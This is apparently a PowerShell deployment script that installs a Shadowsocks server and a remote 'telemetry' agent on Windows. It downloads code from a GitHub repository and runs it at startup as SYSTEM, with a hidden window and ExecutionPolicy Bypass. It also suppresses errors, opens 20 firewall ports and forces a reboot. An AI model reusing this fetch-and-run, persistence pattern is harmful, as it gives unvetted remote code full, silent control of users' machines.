$ErrorActionPreference = "SilentlyContinue"

$ssFolder    = Join-Path $env:ProgramFiles "sserver"
$agentFolder = Join-Path $env:ProgramFiles "telemetry-agent"
$webuiUrl            = "https://liveip.ratul.fun"
$telemetryEndpoint   = "$webuiUrl/api/telemetry"
$ssTaskName          = "Shadowsocks Server"
$telemetryTaskName   = "Telemetry Agent"
$zipUrl              = "https://raw.githubusercontent.com/rezwanahmedratul/logo/main/sserver.zip"
$telemetryScriptUrl  = "https://raw.githubusercontent.com/rezwanahmedratul/logo/main/telemetry.ps1"

Get-Process ssserver -ErrorAction SilentlyContinue | Stop-Process -Force

foreach ($task in @($ssTaskName, $telemetryTaskName)) {
    if (Get-ScheduledTask -TaskName $task -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $task -Confirm:$false
    }
}

foreach ($folder in @($ssFolder, $agentFolder)) {
    if (Test-Path $folder) {
        Remove-Item $folder -Recurse -Force
    }
}

New-Item -ItemType Directory -Path $ssFolder -Force | Out-Null

$tempZip = "$env:TEMP\sserver.zip"
curl.exe -L $zipUrl -o $tempZip

Expand-Archive -Path $tempZip -DestinationPath $ssFolder -Force
Remove-Item $tempZip -Force

foreach ($port in 12345..12364) {
    netsh advfirewall firewall add rule name="Shadowsocks TCP $port" dir=in action=allow protocol=TCP localport=$port
    netsh advfirewall firewall add rule name="Shadowsocks UDP $port" dir=in action=allow protocol=UDP localport=$port
}

New-Item -ItemType Directory -Path $agentFolder -Force | Out-Null
$agentPath = Join-Path $agentFolder "telemetry.ps1"

Invoke-WebRequest -Uri $telemetryScriptUrl -OutFile $agentPath -UseBasicParsing

$content = Get-Content $agentPath -Raw
$content = $content -replace 'https://[^"]*ingest-telemetry', $telemetryEndpoint
$content = $content -replace 'https://[^"]*/api/telemetry', $telemetryEndpoint
Set-Content -Path $agentPath -Value $content -Encoding UTF8

$ssVbs = Join-Path $ssFolder "run\_ss.vbs"
if (Test-Path $ssVbs) {
    $action  = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$ssVbs`""
    $trigger = New-ScheduledTaskTrigger -AtStartup
    Register-ScheduledTask -TaskName $ssTaskName -Action $action -Trigger $trigger -User "SYSTEM" -RunLevel Highest -Force
}

$action  = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$agentPath`""
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName $telemetryTaskName -Action $action -Trigger $trigger -User "SYSTEM" -RunLevel Highest -Force

Start-ScheduledTask -TaskName $telemetryTaskName
if (Get-ScheduledTask -TaskName $ssTaskName -ErrorAction SilentlyContinue) {
    Start-ScheduledTask -TaskName $ssTaskName
}

Write-Host "================================="
Write-Host "Installation completed"
Write-Host "Your Computer will restart in 5 seconds to apply changes."
Write-Host "================================="

for ($i = 5; $i -gt 0; $i--) {
    Write-Host "Restarting in $i..."
    Start-Sleep -Seconds 1
}

Restart-Computer -Force